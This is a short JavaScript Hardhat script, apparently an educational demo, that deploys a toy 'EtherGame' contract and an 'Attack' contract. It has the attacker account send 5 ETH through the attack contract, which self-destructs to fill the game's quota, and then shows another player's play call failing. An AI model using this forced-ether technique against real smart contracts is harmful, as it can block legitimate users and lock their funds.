
async function main () {
    // We get the contract to deploy
    const [owner,Eve,bob] = await ethers.getSigners();
    const Victim = await ethers.getContractFactory('EtherGame');
    const victim = await Victim.deploy();
    const Attack = await ethers.getContractFactory('Attack');
    const attack = await Attack.deploy(victim.address);
    console.log("Deployed both attacking and victim contracts")
    console.log("Using Attack contract to fill quota and self destructing")
    await attack.connect(Eve).attack({value:ethers.utils.parseEther("5.0")});
    console.log("Quota filled bob will now attempt to play resulting in:")
    try{
      await victim.connect(bob).play({value:ethers.utils.parseEther("1.0")});
    }catch(err) {
      console.log(err);
    };
  }
  
  main()
    .then(() => process.exit(0))
    .catch(error => {
      console.error(error);
      process.exit(1);
    });
